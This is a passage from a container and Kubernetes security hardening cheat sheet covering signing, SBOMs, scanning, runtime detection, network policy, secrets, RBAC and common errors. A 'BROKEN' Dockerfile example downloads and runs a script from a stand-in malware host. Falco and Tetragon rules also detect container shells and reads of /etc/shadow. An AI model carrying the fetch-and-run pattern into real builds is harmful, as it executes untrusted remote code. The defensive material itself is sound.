chmod +x cosign-linux-amd64 && sudo mv cosign-linux-amd64 /usr/local/bin/cosign

# Keyless sign (uses OIDC identity → Fulcio cert → Rekor transparency log)
cosign sign --identity-token $(gcloud auth print-identity-token) \
  ghcr.io/myorg/myapp@sha256:abc123...

# Sign with explicit GitHub Actions token
COSIGN_EXPERIMENTAL=1 cosign sign ghcr.io/myorg/myapp@sha256:abc123...

# Verify
cosign verify \
  --certificate-identity 'https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main' \
  --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
  ghcr.io/myorg/myapp@sha256:abc123...
```

### cosign — Key-Based

```bash
# Generate keypair
cosign generate-key-pair        # cosign.key + cosign.pub

# Sign
cosign sign --key cosign.key ghcr.io/myorg/myapp:1.2.3

# Verify
cosign verify --key cosign.pub ghcr.io/myorg/myapp:1.2.3
```

### Sigstore Components

```bash
# Fulcio — issues short-lived certs tied to OIDC identity
# Rekor — transparency log; every signature recorded immutably
# Cosign — signing client

# Inspect Rekor entry
rekor-cli search --sha sha256:abc123...
rekor-cli get --uuid 24296fb24b8ad77a...
```

### Notation (Notary v2)

```bash
# Install
curl -L https://github.com/notaryproject/notation/releases/latest/download/notation_linux_amd64.tar.gz | tar xz

# Generate cert
notation cert generate-test --default mycert

# Sign
notation sign ghcr.io/myorg/myapp:1.2.3

# Verify
notation verify ghcr.io/myorg/myapp:1.2.3 \
  --policy '{"version":"1.0","trustPolicies":[{"name":"prod","registryScopes":["*"],"signatureVerification":{"level":"strict"}}]}'
```

### Sigstore Policy Controller (Kubernetes)

```yaml
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: signed-by-prod-pipeline
spec:
  images:
    - glob: "ghcr.io/myorg/*"
  authorities:
    - keyless:
        url: https://fulcio.sigstore.dev
        identities:
          - issuer: https://token.actions.githubusercontent.com
            subject: https://github.com/myorg/.+/.github/workflows/release.yml@refs/heads/main
```

## SBOM

A Software Bill of Materials enumerates every package, license, and version in your image. Required by EO 14028 (US federal) and increasingly by enterprise procurement.

### syft

```bash
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SBOM (default SPDX)
syft myimage:latest

# Output formats
syft myimage:latest -o spdx-json > sbom.spdx.json
syft myimage:latest -o cyclonedx-json > sbom.cdx.json
syft myimage:latest -o table

# Scan filesystem (for build artifacts)
syft dir:./build -o cyclonedx-json
```

### CycloneDX

```bash
# Generate via cyclonedx-go
cyclonedx-gomod app -licenses -json -output bom.json ./

# For node
cyclonedx-bom -o bom.xml

# For Python
cyclonedx-py -i requirements.txt -o bom.json
```

### Format Differences

```bash
# SPDX (Linux Foundation, ISO/IEC 5962:2021)
#   - License-focused
#   - Verbose, supports document-level relationships
#   - Required by US federal procurement

# CycloneDX (OWASP)
#   - Security-focused
#   - Compact, JSON-first
#   - Better for vulnerability matching
```

### SBOM in Container Labels

```dockerfile
LABEL org.opencontainers.image.sbom='{"format":"SPDX","url":"https://example.com/sbom/myapp-1.2.3.json"}'
```

### Cosign Attestation

```bash
# Attach SBOM as cosign attestation
cosign attest --predicate sbom.cdx.json --type cyclonedx \
  ghcr.io/myorg/myapp@sha256:abc123...

# Verify
cosign verify-attestation --type cyclonedx \
  --certificate-identity '...' \
  --certificate-oidc-issuer '...' \
  ghcr.io/myorg/myapp@sha256:abc123... | jq -r .payload | base64 -d | jq
```

## Vulnerability Scanning

Scanners cross-reference SBOM against public vulnerability databases (NVD, GHSA, OSV). Run in CI to gate releases and on registry push to detect zero-days in deployed images.

### Trivy

```bash
# Install
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Scan image
trivy image myimage:latest

# Filter severity
trivy image --severity HIGH,CRITICAL --exit-code 1 myimage:latest

# Ignore unfixed
trivy image --ignore-unfixed myimage:latest

# Filesystem scan (source repo)
trivy fs --scanners vuln,secret,misconfig ./

# Misconfig scan (Dockerfile, Kubernetes YAML, Terraform)
trivy config ./

# SBOM scan
trivy sbom sbom.cdx.json

# Output formats
trivy image -f json -o report.json myimage:latest
trivy image -f sarif -o trivy.sarif myimage:latest
trivy image -f cyclonedx myimage:latest

# Offline DB
trivy image --download-db-only
trivy image --skip-db-update --offline-scan myimage:latest

# Cache
export TRIVY_CACHE_DIR=~/.cache/trivy
```

### Grype

```bash
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

grype myimage:latest
grype myimage:latest --fail-on critical
grype sbom:./sbom.spdx.json
grype dir:./build
```

### Clair

```bash
# clairctl
clairctl --host http://localhost:6060 report myimage:latest

# Or via Quay registry built-in
quay-cli report myimage:latest
```

### Severity Filtering

```bash
# CVSS v3 levels
# CRITICAL  9.0-10.0
# HIGH      7.0-8.9
# MEDIUM    4.0-6.9
# LOW       0.1-3.9
# UNKNOWN

trivy image --severity CRITICAL --exit-code 1 myimage    # block deploy on critical
```

### CI Gate

```yaml
# .github/workflows/security.yml
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aquasecurity/trivy-action@master
        with:
          image-ref: ghcr.io/myorg/myapp:${{ github.sha }}
          format: sarif
          output: trivy.sarif
          severity: HIGH,CRITICAL
          exit-code: 1
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy.sarif
```

## Supply Chain

Supply-chain security is a layered model: source, build, provenance, and final dependency policy. SLSA (Supply-chain Levels for Software Artifacts) is the Google/CNCF framework.

### SLSA Levels

```bash
# SLSA 1 — documented build process; provenance file produced
# SLSA 2 — version-controlled source, hosted build, signed provenance
# SLSA 3 — source/build tampering hardened, non-falsifiable provenance
# SLSA 4 — two-person review, hermetic + reproducible builds

# Each level has Source / Build / Provenance / Common requirements
# https://slsa.dev/spec/v1.0/levels
```

### in-toto Attestations

```bash
# in-toto layout describes expected build steps + trusted parties
in-toto-run --step-name compile --key keys/build.key -- gcc -o app app.c

# Verify
in-toto-verify --layout root.layout --key root.pub
```

### Provenance Generators

```bash
# slsa-github-generator
- uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
  with:
    image: ghcr.io/myorg/myapp
    digest: sha256:abc123...
    registry-username: ${{ github.actor }}
  secrets:
    registry-password: ${{ secrets.GITHUB_TOKEN }}
```

### Reproducible Builds

```bash
# Properties:
#   - Same source + same toolchain + same env → byte-identical output
#   - Detect malicious build server by independent rebuild
#   - SOURCE_DATE_EPOCH variable freezes timestamps

SOURCE_DATE_EPOCH=$(git log -1 --pretty=%ct) docker build -t myapp .

# Verify
docker images --digests myapp:latest
# Independent CI rebuilds → digests match
```

### Cosign Attest Chain

```bash
# Sign image
cosign sign ghcr.io/myorg/myapp@sha256:abc

# Attach SBOM
cosign attest --predicate sbom.cdx.json --type cyclonedx ghcr.io/myorg/myapp@sha256:abc

# Attach SLSA provenance
cosign attest --predicate provenance.json --type slsaprovenance ghcr.io/myorg/myapp@sha256:abc

# Attach vulnerability scan
cosign attest --predicate trivy.json --type vuln ghcr.io/myorg/myapp@sha256:abc

# Verify all
cosign verify-attestation --type slsaprovenance ghcr.io/myorg/myapp@sha256:abc
```

## Runtime Security

Image scanning catches known issues; runtime detection catches active attacks. Modern tools use eBPF to attach kprobes/uprobes without kernel modules.

### Falco

```bash
# Install
curl -s https://falco.org/repo/falcosecurity-packages.asc | gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" | sudo tee /etc/apt/sources.list.d/falcosecurity.list
sudo apt update && sudo apt install -y falco

# Run
sudo systemctl enable --now falco-modern-bpf

# Tail alerts
sudo tail -f /var/log/falco_events.log

# Sample rule
- rule: Shell in container
  desc: Notice shell activity within a container
  condition: >
    spawned_process and container and shell_procs and proc.tty != 0
  output: >
    Shell spawned in container (user=%user.name container=%container.name shell=%proc.name)
  priority: WARNING
```

### Tetragon (Cilium)

```bash
# Install via Helm
helm repo add cilium https://helm.cilium.io/
helm install tetragon cilium/tetragon -n kube-system

# Tail observability
kubectl exec -n kube-system ds/tetragon -- tetra getevents -o compact

# TracingPolicy CRD example
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: file-monitoring
spec:
  kprobes:
  - call: security_file_open
    syscall: false
    args:
    - index: 0
      type: file
    selectors:
    - matchArgs:
      - index: 0
        operator: Prefix
        values: ["/etc/shadow"]
```

### Tracee (Aqua)

```bash
docker run --name tracee --rm --pid=host --cgroupns=host --privileged \
  -v /etc/os-release:/etc/os-release-host:ro \
  -v /var/run:/var/run:ro \
  aquasec/tracee:latest

# Filter events
tracee --output json --filter event=execve,openat
```

### Kernel-Event vs Syscall-Event

```bash
# Syscall events (seccomp, ptrace-based, syscall tracepoints)
#   + Easier mental model
#   + Most attacks ultimately syscall
#   - Easy to bypass with non-syscall mechanisms (eBPF programs themselves)
#   - High volume

# Kernel events (LSM hooks, kprobes on internal functions)
#   + Hard to bypass — semantic events
#   + Lower volume, higher signal
#   - Tied to kernel version (uprobe/kprobe symbol drift)
#   - Steeper learning curve
```

## Network Hardening

Default Docker bridges expose every container to every other container. Lock down with `--network=none`, internal networks, and explicit egress rules.

### --network none

```bash
# No networking at all
docker run --network=none myimage

# Add lo only — useful for batch jobs that don't need network
```

### Custom Internal Network

```bash
# Create internal-only network (no NAT, no external connectivity)
docker network create --internal --driver bridge backend-net

# Attach
docker run --network backend-net myapp
docker run --network backend-net postgres:16
```

### User-Defined vs Default Bridge

```bash
# Default bridge (docker0):
#   - All containers see each other on 172.17.0.0/16
#   - No DNS-based service discovery
#   - --link flag (deprecated)

# User-defined bridge:
#   - Automatic DNS resolution by container name
#   - Network-level isolation between bridges
#   - Recommended

docker network create app-net --driver bridge
docker run --network app-net --name db postgres
docker run --network app-net --name app myimage   # can resolve "db"
```

### Egress Filtering

```bash
# Iptables on the host (rootful Docker)
iptables -I DOCKER-USER -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -I DOCKER-USER -d 169.254.169.254 -j DROP    # block cloud metadata
iptables -I DOCKER-USER -d 10.0.0.0/8 -j DROP         # block internal RFC1918

# Or use netavark with podman + nftables policy
# Or NetworkPolicy in Kubernetes (next section)
```

### --dns Override

```bash
# Replace DNS server
docker run --dns=1.1.1.1 --dns=9.9.9.9 myimage

# Override search domains
docker run --dns-search=corp.example.com myimage

# Pin /etc/hosts
docker run --add-host=db.internal:10.0.5.5 myimage
```

## Secret Injection

Secrets in env vars leak in `docker inspect`, `/proc/PID/environ`, and crash logs. Mount as files or use a sidecar/init container with short-lived tokens.

### Vault Sidecar Pattern

```yaml
# Pod template with Vault Agent injector
apiVersion: v1
kind: Pod
metadata:
  annotations:
    vault.hashicorp.com/agent-inject: "true"
    vault.hashicorp.com/role: "myapp"
    vault.hashicorp.com/agent-inject-secret-db.json: "secret/data/myapp/db"
    vault.hashicorp.com/agent-inject-template-db.json: |
      {{- with secret "secret/data/myapp/db" -}}
      {"username":"{{ .Data.data.username }}","password":"{{ .Data.data.password }}"}
      {{- end }}
spec:
  serviceAccountName: myapp
  containers:
  - name: app
    image: myapp
    # /vault/secrets/db.json materialized by sidecar
```

### envFrom Risks

```yaml
# DO NOT — env vars leak in pod inspect, logs, /proc
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-secret
      key: password

envFrom:
- secretRef:
    name: db-secret      # all keys become env vars

# Risks:
#   kubectl describe pod / docker inspect shows refs
#   Crash dumps include /proc/PID/environ
#   Subprocess inheritance leaks to children
```

### File-Mount Secret Pattern

```yaml
volumes:
- name: db-creds
  secret:
    secretName: db-secret
    defaultMode: 0400
containers:
- name: app
  volumeMounts:
  - name: db-creds
    mountPath: /etc/app/secrets
    readOnly: true
```

### Projected Volume

```yaml
volumes:
- name: combined
  projected:
    sources:
    - secret:
        name: tls-cert
    - secret:
        name: api-key
    - serviceAccountToken:
        path: token
        expirationSeconds: 3600
        audience: api.example.com
```

### Buildx Cache Secret

```dockerfile
# syntax=docker/dockerfile:1.4
FROM alpine
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
    npm install --registry $(grep registry /root/.npmrc | cut -d= -f2)
```

```bash
docker buildx build --secret id=npmrc,src=$HOME/.npmrc -t myimage .
# Secret is bind-mounted only during the RUN, never baked into a layer
# CHECK with: docker history --no-trunc myimage   # no secret string in any layer
```

### Secrets in Buildx Cache

```bash
# Risk: BuildKit's cache-to/cache-from could accidentally export build secrets
docker buildx build --cache-to=type=registry,ref=myimage:cache --cache-from=...

# Fix: use type=secret for secrets, never ARG/COPY
# Verify cache contents:
crane manifest myimage:cache
```

## K8s Pod Security

PodSecurityStandards replaced PodSecurityPolicy in Kubernetes 1.25. Three levels with progressive strictness, applied by namespace label.

### PodSecurityStandards

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: prod
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

# Levels:
# privileged   — unrestricted; for system workloads only
# baseline     — minimally restrictive; prevents known privilege escalations
# restricted   — heavily restricted; defense-in-depth
```

### Restricted Compliance

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    runAsGroup: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
    supplementalGroups: []
  hostNetwork: false
  hostPID: false
  hostIPC: false
  containers:
  - name: app
    image: ghcr.io/myorg/myapp@sha256:abc...
    imagePullPolicy: Always
    securityContext:
      runAsNonRoot: true
      runAsUser: 65534
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      seccompProfile:
        type: RuntimeDefault
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
        ephemeral-storage: "1Gi"
      requests:
        cpu: "100m"
        memory: "128Mi"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: 64Mi
```

### Verify Compliance

```bash
# Test if a manifest passes restricted profile
kubectl apply --dry-run=server -f pod.yaml -n prod

# Use kubeaudit
kubeaudit all -f pod.yaml

# Use kubesec
kubesec scan pod.yaml
```

### Deprecated PodSecurityPolicy

```bash
# Removed in 1.25
# Migration:
#   - kubectl get psp                                # was deprecated since 1.21
#   - kyverno / OPA Gatekeeper / kube-bench         # replacements
#   - PodSecurityStandards                           # built-in successor
```

## K8s NetworkPolicy

NetworkPolicy provides L3/L4 ACLs between pods. Default Kubernetes is "allow all"; NetworkPolicy moves it to "deny by default" once any policy applies to a pod.

### Default Deny All

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: prod
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

### Egress to kube-dns Only

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: prod
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

### Allow Specific Namespace

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-from-frontend
  namespace: prod
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes: [Ingress]
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          team: frontend
      podSelector:
        matchLabels:
          app: web
    ports:
    - protocol: TCP
      port: 8080
```

### Egress to Internet via Specific CIDR

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-stripe-api
  namespace: prod
spec:
  podSelector:
    matchLabels:
      app: payments
  policyTypes: [Egress]
  egress:
  - to:
    - ipBlock:
        cidr: 54.187.205.235/32     # api.stripe.com
    ports:
    - protocol: TCP
      port: 443
```

### CNI Requirement

```bash
# NetworkPolicy needs a CNI that implements it:
#   Calico, Cilium, Weave, Antrea, kube-router
# Flannel alone does NOT enforce policies

# Verify CNI
kubectl get pods -n kube-system | grep -E "calico|cilium|weave|antrea|flannel"
```

## K8s RBAC

ServiceAccounts get a default token mounted into every pod. Without RBAC the token has no permissions; with too much, a compromised pod has cluster-wide access.

### Least-Privilege ServiceAccount

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp
  namespace: prod
automountServiceAccountToken: false       # opt out of auto-mount

---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: prod
  name: myapp-reader
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["app-config"]
  verbs: ["get"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: prod
  name: myapp-binding
subjects:
- kind: ServiceAccount
  name: myapp
  namespace: prod
roleRef:
  kind: Role
  name: myapp-reader
  apiGroup: rbac.authorization.k8s.io
```

### Audit Effective Permissions

```bash
# What can the SA do?
kubectl auth can-i --list --as system:serviceaccount:prod:myapp

# Specific verb
kubectl auth can-i create pods --as system:serviceaccount:prod:myapp -n prod

# Effective for current user
kubectl auth can-i '*' '*'

# Use kubectl-who-can plugin for reverse lookup
kubectl who-can delete pods -n prod
```

### Avoid cluster-admin Bindings

```bash
# Find ClusterRoleBindings to cluster-admin
kubectl get clusterrolebindings -o json | jq -r \
  '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name + "\t" + (.subjects // [] | tostring)'
```

### Disable Default Token Mount

```yaml
# Pod-level
spec:
  automountServiceAccountToken: false

# ServiceAccount-level
apiVersion: v1
kind: ServiceAccount
metadata:
  name: noaccess
automountServiceAccountToken: false
```

## Distroless / Static

Distroless images remove the shell, package manager, and most utilities. A compromised process has nothing to pivot to — no `sh`, no `cat`, no `wget`.

### Distroless Variants

```bash
# Static binaries (Go, Rust, no cgo)
gcr.io/distroless/static:nonroot
gcr.io/distroless/static:debug             # has busybox shell

# C / cgo binaries
gcr.io/distroless/cc-debian12
gcr.io/distroless/cc-debian12:nonroot

# Python 3.11
gcr.io/distroless/python3-debian12

# Java 17 / 21
gcr.io/distroless/java17-debian12
gcr.io/distroless/java21-debian12

# Node.js 20
gcr.io/distroless/nodejs20-debian12
```

### Chiseled Ubuntu

```dockerfile
FROM ubuntu/chiseled-jre:21-22.04 AS runtime
COPY app.jar /app.jar
ENTRYPOINT ["java","-jar","/app.jar"]
```

```bash
# Chisel CLI
chisel cut --release ubuntu-22.04 --root rootfs ca-certificates_data libc6_libs
```

### UPX vs cgroup Memory

```bash
# UPX-packed binaries decompress at startup, doubling RSS during decompression
# This conflicts with tight cgroup memory limits → OOM-kill on launch

# Avoid UPX in containerized binaries unless you size memory limit for 2x peak
# Better: -ldflags "-s -w" + go build (already small)
go build -ldflags "-s -w -extldflags '-static'" -o app .
```

### Debug Without Shell

```bash
# Distroless has no shell → can't kubectl exec normally
# Solutions:
#   1. Use :debug variant (has busybox)
#   2. Ephemeral debug containers
kubectl debug -it pod/myapp --image=busybox --target=main
#   3. Inject toolbox via shareProcessNamespace
```

## Buildkit Cache Mounts

BuildKit's `--mount` lets you bind volumes into a single `RUN` step without baking them into the final layer. Three modes: cache, secret, ssh.

### type=cache

```dockerfile
# syntax=docker/dockerfile:1.7
FROM golang:1.22 AS build
WORKDIR /src
COPY go.* ./
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    go mod download
COPY . .
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    CGO_ENABLED=0 go build -o /out/app .
```

### type=secret

```dockerfile
# syntax=docker/dockerfile:1.7
RUN --mount=type=secret,id=github_token,target=/run/secrets/gh \
    git clone https://x:$(cat /run/secrets/gh)@github.com/myorg/private-deps.git
```

```bash
docker buildx build --secret id=github_token,env=GH_TOKEN -t myimage .
# Or from file:
docker buildx build --secret id=github_token,src=$HOME/.github_token -t myimage .
```

### type=ssh

```dockerfile
# syntax=docker/dockerfile:1.7
RUN --mount=type=ssh \
    ssh-keyscan github.com >> ~/.ssh/known_hosts && \
    git clone git@github.com:myorg/private.git
```

```bash
eval $(ssh-agent)
ssh-add ~/.ssh/id_ed25519
docker buildx build --ssh default -t myimage .
```

### type=bind

```dockerfile
# Read-only bind from build context (avoids COPY layer)
RUN --mount=type=bind,source=./scripts,target=/scripts \
    /scripts/setup.sh
```

### Verify Secret Not Baked

```bash
# Inspect every layer for the secret string
docker history --no-trunc myimage | grep -i SECRET
docker save myimage | tar -tvf - | grep .tar
docker save myimage -o /tmp/img.tar
tar -xf /tmp/img.tar -C /tmp/img
grep -r "ghp_" /tmp/img    # should be empty
```

## CIS Docker Benchmark

The Center for Internet Security publishes benchmarks for Docker, Kubernetes, and most major distros. The Docker Benchmark v1.6.0 has 100+ controls grouped into seven sections.

### Section Overview

```bash
# Section 1: Docker Daemon Configuration  (host-level)
#   1.1.x  Linux Hosts Specific
#   1.2.x  Docker Daemon

# Section 2: Docker Daemon Configuration Files
#   2.x   /etc/docker/, /etc/systemd/system/docker.service.d/, key files

# Section 3: Container Images and Build File
#   3.x   Use trusted base images, scan, sign, no setuid, etc.

# Section 4: Container Runtime
#   4.x   Run as non-root, drop caps, read-only, no privileged, etc.

# Section 5: Docker Security Operations
#   5.x   Audit, monitor, patch

# Section 6: Docker Swarm Configuration
# Section 7: Docker Enterprise (UCP / DTR — now legacy)
```

### docker-bench-security

```bash
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo ./docker-bench-security.sh

# Run specific checks
sudo ./docker-bench-security.sh -c container_images
sudo ./docker-bench-security.sh -c container_runtime

# JSON output
sudo ./docker-bench-security.sh -l /tmp/dbs.log -j
```

### Sample High-Value Controls

```bash
# 1.2.1  Ensure a separate partition for containers has been created
mount | grep /var/lib/docker

# 1.2.5  Ensure aufs storage driver is not used
docker info | grep -i "Storage Driver"

# 2.1   Run docker daemon as non-root user (rootless)
ps -ef | grep dockerd

# 2.5   Restrict default bridge network
docker network inspect bridge | grep "com.docker.network.bridge.enable_icc"

# 4.1   Create user for the container (USER directive)
docker run --rm myimage id

# 4.5   Enable Content Trust
export DOCKER_CONTENT_TRUST=1
```

## NIST SP 800-190

NIST SP 800-190 (2017) is the US federal Application Container Security Guide. Four chapters of risks and recommended countermeasures.

### Major Control Families

```bash
# 4.1  Image Risks
#   - Image vulnerabilities, configuration defects, embedded malware,
#     embedded clear-text secrets, untrusted images

# 4.2  Registry Risks
#   - Insecure connections, stale images, insufficient authentication

# 4.3  Orchestrator Risks
#   - Unbounded admin access, unauthorized inter-pod traffic,
#     mixing workloads of different sensitivities, orchestrator node trust

# 4.4  Container Risks
#   - Vulnerabilities, insecure configurations, app vulnerabilities,
#     rogue containers

# 4.5  Host OS Risks
#   - Large attack surface, shared kernel, host OS vulnerabilities,
#     improper user access rights, host file system tampering

# 5    Countermeasures
#   - Image scanning + signing, registry TLS + auth, RBAC, microsegmentation,
#     minimal host OS, host monitoring
```

### Compliance Mappings

```bash
# NIST 800-53 control family overlap
#   AC (Access Control)
#   AU (Audit and Accountability)
#   CM (Configuration Management)
#   IA (Identification and Authentication)
#   SC (System and Communications Protection)
#   SI (System and Information Integrity)

# Use OpenSCAP profiles
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis \
  --results /tmp/scan.xml /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
```

## Common Errors

Verbatim error text and fixes. Many of these are reported daily on Stack Overflow.

### "OCI runtime create failed"

```text
Error response from daemon: failed to create shim: OCI runtime create failed:
runc create failed: unable to start container process: exec: "/bin/sh":
stat /bin/sh: no such file or directory: unknown
```

```bash
# Cause: distroless / scratch base, no shell present, ENTRYPOINT in shell form
# Fix: use exec form
ENTRYPOINT ["/app/bin/server", "--port=8080"]
# NOT: ENTRYPOINT /app/bin/server --port=8080
```

### "permission denied" (rootless bind mount)

```text
docker: Error response from daemon: error while creating mount source path '/data':
mkdir /data: permission denied.
```

```bash
# Cause: rootless daemon can't write to /data on host
# Fix: chown the path to subuid range
sudo chown 100000:100000 /data
# Or use a path inside $HOME
docker run -v $HOME/data:/data myimage
```

### "operation not permitted" (no-new-privileges + setuid)

```text
sudo: effective uid is not 0, is /usr/bin/sudo on a file system with the 'nosuid' option set
```

```bash
# Cause: --security-opt no-new-privileges blocks setuid bit
# Fix: remove no-new-privileges (bad), or restructure to not need sudo (good)
# Best: drop sudo, give the cap directly via --cap-add
```

### "exec /bin/sh: no such file or directory" (distroless)

```text
OCI runtime exec failed: exec failed: unable to start container process:
exec: "/bin/sh": stat /bin/sh: no such file or directory: unknown
```

```bash
# Cause: kubectl exec -it pod -- sh on distroless image
# Fix:
kubectl debug -it pod/myapp --image=busybox --target=app
# Or use :debug variant
docker run gcr.io/distroless/static:debug
```

### "failed to add the host" (CAP_NET_ADMIN missing)

```text
Error response from daemon: failed to create endpoint mycontainer on network bridge:
failed to add the host (vethXXXX) <=> sandbox (vethYYYY) pair interfaces:
operation not permitted
```

```bash
# Cause: rootless daemon without slirp4netns or CAP_NET_ADMIN
# Fix: install slirp4netns, or use --network=host (lose isolation)
sudo apt install slirp4netns
```

### "pull access denied"

```text
Error response from daemon: pull access denied for myorg/private,
repository does not exist or may require 'docker login':
denied: requested access to the resource is denied
```

```bash
docker login ghcr.io -u USERNAME --password-stdin <<< "$GH_PAT"
docker login -u USERNAME -p PASSWORD docker.io
```

### "denied: unauthorized: authentication required"

```bash
# Same family as above; the registry rejected your token
# Check token scopes
curl -u user:token https://ghcr.io/token?service=ghcr.io&scope=repository:myorg/myimage:pull
```

### "Insufficient privileges to access /var/lib/docker"

```text
Error: Insufficient privileges to access /var/lib/docker. Are you running as root?
```

```bash
# Cause: client expecting rootful daemon, user not in docker group
sudo usermod -aG docker $USER
newgrp docker
# Or use rootless:
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock
```

### "iptables failed"

```text
docker: Error response from daemon: driver failed programming external connectivity
on endpoint mycontainer:
iptables failed: iptables --wait -t nat -A DOCKER -p tcp -d 0/0 --dport 8080 -j DNAT
--to-destination 172.17.0.2:8080 ! -i docker0:
iptables: No chain/target/match by that name.
```

```bash
# Cause: Docker chains lost (often after firewalld restart)
sudo systemctl restart docker
# Or:
sudo iptables -N DOCKER 2>/dev/null
sudo iptables -t nat -N DOCKER 2>/dev/null
```

### "no space left on device" (overlay2)

```text
Error response from daemon: write /var/lib/docker/tmp/buildkit-mount...
no space left on device
```

```bash
docker system df
docker system prune -af --volumes
docker builder prune -af

# Move docker root
echo '{"data-root":"/srv/docker"}' | sudo tee /etc/docker/daemon.json
sudo systemctl restart docker
```

### Other Frequent Errors

```text
# Capability missing
ping: socket: Operation not permitted
# Fix: --cap-add NET_RAW

# Port reservation denied
nginx: [emerg] bind() to 0.0.0.0:80 failed (13: Permission denied)
# Fix: --cap-add NET_BIND_SERVICE  OR use --user 0  OR map a high port

# Kernel module missing
modprobe: ERROR: could not insert 'br_netfilter': Operation not permitted
# Fix: load on host first; container shouldn't load modules

# Userns map exhausted
newuidmap: write to uid_map failed: Invalid argument
# Fix: extend /etc/subuid range
sudo usermod --add-subuids 100000-265536 $USER

# Docker socket missing
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
# Fix: systemctl start docker (rootful) OR systemctl --user start docker (rootless)
```

## Common Gotchas

Eight broken→fixed pairs of the most-stepped-on landmines.

### USER 0 still root

```dockerfile
# BROKEN
FROM ubuntu
RUN useradd -m alice
USER 0                       # forgot to switch — still root
COPY app /app
CMD ["/app"]
```

```dockerfile
# FIXED
FROM ubuntu
RUN useradd -m alice
COPY --chown=alice:alice app /home/alice/app
USER alice
CMD ["/home/alice/app"]
```

### --privileged for "convenience"

```bash
# BROKEN — debugging GPU? add --privileged "to make it work"
docker run --privileged --rm nvidia/cuda:12.0-base nvidia-smi

# FIXED
docker run --gpus all --rm nvidia/cuda:12.0-base nvidia-smi
```

### Bind-mounting docker.sock = root on host

```bash
# BROKEN — gives container the keys to the kingdom
docker run -v /var/run/docker.sock:/var/run/docker.sock myci-runner

# FIXED — use sysbox runtime, or rootless docker-in-docker, or a Buildkit daemon
docker run --runtime=sysbox-runc nestybox/dind
# Or use Kaniko for image builds without Docker daemon
gcr.io/kaniko-project/executor --dockerfile=./Dockerfile --destination=ghcr.io/myorg/img
```

### Secrets in COPY layer

```dockerfile
# BROKEN — secret baked into a layer, visible in `docker history`
COPY .env /app/.env
RUN ./build.sh
RUN rm /app/.env             # ← does NOT remove from earlier layer
```

```dockerfile
# FIXED — use BuildKit secret mount
# syntax=docker/dockerfile:1.7
RUN --mount=type=secret,id=env,target=/app/.env ./build.sh
```

### ADD with HTTP URL

```dockerfile
# BROKEN — fetches over HTTP, no TLS, no signature, MITM trivial
ADD http://malware.example.com/installer.sh /tmp/
RUN bash /tmp/installer.sh
```

```dockerfile
# FIXED — use HTTPS, verify checksum
ADD --checksum=sha256:abc... https://example.com/installer.sh /tmp/
RUN bash /tmp/installer.sh

# Or pre-fetch in CI and use COPY
```

### :latest tag drift

```dockerfile
# BROKEN
FROM node:latest
# Wakes up tomorrow with Node 22 instead of 20, breaks app
```

```dockerfile
# FIXED — pin by digest
FROM node:20.11.1-bookworm-slim@sha256:c1...
```

### Build-args leaking secrets

```dockerfile
# BROKEN — ARG values appear in `docker history` output
ARG DB_PASSWORD
